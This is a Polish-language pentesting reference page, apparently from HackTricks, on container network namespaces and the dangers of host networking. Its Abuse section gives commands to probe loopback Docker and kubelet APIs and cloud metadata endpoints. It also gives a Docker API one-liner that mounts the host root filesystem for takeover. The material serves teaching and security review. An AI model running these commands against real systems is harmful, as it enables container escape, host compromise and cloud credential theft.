# Przestrzeń nazw sieci

{{#include ../../../../../banners/hacktricks-training.md}}

## Przegląd

Przestrzeń nazw sieci izoluje zasoby związane z siecią, takie jak interfejsy, adresy IP, tabele routingu, stan ARP/neighbor, reguły firewalla, sockety oraz zawartość plików takich jak `/proc/net`. Dlatego kontener może mieć coś, co wygląda na własne `eth0`, własne lokalne trasy i własne urządzenie loopback bez posiadania rzeczywistego stosu sieciowego hosta.

Z punktu widzenia bezpieczeństwa ma to znaczenie, ponieważ izolacja sieci to coś więcej niż wiązanie portów. Prywatna przestrzeń nazw sieci ogranicza to, co workload może bezpośrednio obserwować lub rekonfigurować. Gdy ta przestrzeń nazw zostanie udostępniona hostowi, kontener nagle może zyskać widoczność listeningów hosta, usług lokalnych hosta i punktów kontroli sieci, które nigdy nie miały być ujawnione aplikacji.

## Działanie

Świeżo utworzona przestrzeń nazw sieci zaczyna się z pustym lub prawie pustym środowiskiem sieciowym, dopóki nie zostaną do niej podłączone interfejsy. Runtimy kontenerów następnie tworzą lub łączą wirtualne interfejsy, przypisują adresy i konfigurują trasy, aby workload miał oczekiwaną łączność. W wdrożeniach opartych na bridge zwykle oznacza to, że kontener widzi interfejs oparty na veth połączony z bridge hosta. W Kubernetes wtyczki CNI obsługują równoważne ustawienie dla sieciowania Podów.

Ta architektura wyjaśnia, dlaczego `--network=host` lub `hostNetwork: true` to tak drastyczna zmiana. Zamiast otrzymać przygotowany prywatny stos sieciowy, workload dołącza do rzeczywistego stosu hosta.

## Laboratorium

Możesz zobaczyć prawie pustą przestrzeń nazw sieci za pomocą:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Możesz porównać zwykłe i host-networked kontenery za pomocą:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Kontener korzystający z sieci hosta nie ma już własnego, izolowanego widoku gniazd i interfejsów. Sama ta zmiana jest już istotna, zanim jeszcze zapytasz, jakie capabilities ma proces.

## Runtime Usage

Docker i Podman zwykle tworzą prywatny namespace sieciowy dla każdego kontenera, chyba że skonfigurowano inaczej. Kubernetes zazwyczaj przydziela każdemu Pod własny namespace sieciowy, współdzielony przez kontenery w tym Pod, ale oddzielny od hosta. Incus/LXC systemy także zapewniają zaawansowaną izolację opartą na namespace sieciowym, często z szerszą gamą wirtualnych konfiguracji sieciowych.

Zasadą jest, że prywatne sieci są domyślną granicą izolacji, podczas gdy korzystanie z sieci hosta to jawne wyłączenie się z tej granicy.

## Misconfigurations

Najważniejszym błędem konfiguracji jest po prostu współdzielenie namespace sieciowego hosta. Robi się to czasem dla wydajności, niskopoziomowego monitoringu lub wygody, ale usuwa to jedną z najczystszych granic dostępnych dla kontenerów. Nasłuchujące lokalnie na hoście usługi stają się łatwiej osiągalne, usługi dostępne tylko na localhost mogą stać się dostępne, a capabilities takie jak `CAP_NET_ADMIN` czy `CAP_NET_RAW` stają się znacznie bardziej niebezpieczne, ponieważ operacje, które umożliwiają, są teraz stosowane w środowisku sieciowym samego hosta.

Innym problemem jest nadawanie zbyt szerokich capabilities związanych z siecią nawet gdy namespace sieciowy jest prywatny. Prywatny namespace pomaga, ale nie sprawia, że raw sockets czy zaawansowana kontrola sieci stają się nieszkodliwe.

W Kubernetes `hostNetwork: true` także zmienia, ile zaufania możesz mieć w segmentację sieciową na poziomie Pod. Kubernetes dokumentuje, że wiele pluginów sieciowych nie potrafi poprawnie odróżnić ruchu `hostNetwork` Podów podczas dopasowywania `podSelector` / `namespaceSelector` i dlatego traktuje go jak zwykły ruch węzła. Z punktu widzenia atakującego oznacza to, że skompromitowany workload z `hostNetwork` często powinien być traktowany jako punkt zaczepienia w sieci na poziomie węzła, a nie jako zwykły Pod nadal ograniczony tymi samymi założeniami polityki co workloady korzystające z overlay network.

## Abuse

W słabo izolowanych konfiguracjach atakujący mogą sprawdzać nasłuchujące na hoście usługi, uzyskać dostęp do punktów zarządzania związanych tylko z loopback, podsłuchiwać lub ingerować w ruch w zależności od konkretnych capabilities i środowiska, albo rekonfigurować routing i stan firewalla jeśli obecne jest `CAP_NET_ADMIN`. W klastrze może to również ułatwić ruch boczny (lateral movement) i rozpoznanie control-plane.

Jeśli podejrzewasz, że używana jest sieć hosta, zacznij od potwierdzenia, że widoczne interfejsy i nasłuchujące procesy należą do hosta, a nie do izolowanej sieci kontenera:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Loopback-only services często są pierwszym interesującym odkryciem:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Jeśli dostępne są uprawnienia sieciowe, przetestuj, czy workload może przeglądać lub modyfikować widoczny stos:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
W nowoczesnych jądrach host networking wraz z `CAP_NET_ADMIN` może także ujawnić ścieżkę pakietów wykraczającą poza proste zmiany w `iptables` / `nftables`. `tc` qdiscs i filtry są również ograniczone do namespace'ów, więc w współdzielonym host network namespace dotyczą interfejsów hosta, które kontener widzi. Jeśli dodatkowo obecne jest `CAP_BPF`, programy eBPF związane z siecią, takie jak TC i XDP loaders, również stają się istotne:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
To ma znaczenie, ponieważ atakujący może skopiować, przekierować, kształtować lub odrzucić ruch na poziomie interfejsu hosta, a nie tylko przepisać reguły zapory. W prywatnej przestrzeni nazw sieciowych te działania są ograniczone do widoku kontenera; we współdzielonej przestrzeni nazw hosta mają wpływ na hosta.

W środowiskach klastrowych lub chmurowych sieć hosta także uzasadnia szybkie lokalne rozpoznanie metadanych i usług powiązanych z płaszczyzną sterowania:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Pełny przykład: Host networking + lokalny runtime / dostęp do Kubelet

Host networking nie zapewnia automatycznie dostępu root do hosta, ale często udostępnia usługi, które celowo są osiągalne tylko z samego węzła. Jeśli jedna z tych usług jest słabo zabezpieczona, host networking staje się bezpośrednią privilege-escalation path.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet na localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impact:

- bezpośrednie przejęcie hosta, jeśli lokalne API runtime jest wystawione bez odpowiedniej ochrony
- rozpoznanie klastra lub ruch boczny, jeśli kubelet lub lokalni agenci są osiągalni
- manipulacja ruchem lub odmowa usługi, gdy połączone z `CAP_NET_ADMIN`

## Sprawdzenia

Celem tych sprawdzeń jest ustalenie, czy proces ma prywatny stos sieciowy, jakie trasy i nasłuchy są widoczne, oraz czy widok sieci już przypomina widok hosta zanim w ogóle przetestujesz capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
Co warto zauważyć:

- Jeśli `/proc/self/ns/net` i `/proc/1/ns/net` wyglądają już jak z hosta, kontener może współdzielić hostowy network namespace lub inny, niebędący prywatnym namespace.
- `lsns -t net` i `ip netns identify` są przydatne, gdy shell znajduje się już w nazwanym lub trwałym namespace i chcesz skorelować go z obiektami `/run/netns` po stronie hosta.
- `ss -lntup` jest szczególnie wartościowe, ponieważ ujawnia nasłuchy ograniczone do loopback oraz lokalne punkty końcowe zarządzania.
- Trasy, nazwy interfejsów, kontekst firewalla, stan `tc` oraz przyczepienia eBPF stają się znacznie ważniejsze, jeśli obecne są `CAP_NET_ADMIN`, `CAP_NET_RAW` lub `CAP_BPF`.
- W Kubernetes, nieudana rezolucja nazwy usługi z Pod-a `hostNetwork` może po prostu oznaczać, że Pod nie używa `dnsPolicy: ClusterFirstWithHostNet`, a nie że usługa jest nieobecna.

Podczas przeglądu kontenera zawsze oceniaj network namespace razem z zestawem capabilities. Host networking w połączeniu z rozbudowanymi możliwościami sieciowymi to zupełnie inna postura niż bridge networking z wąskim domyślnym zestawem capabilities.

## References

- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
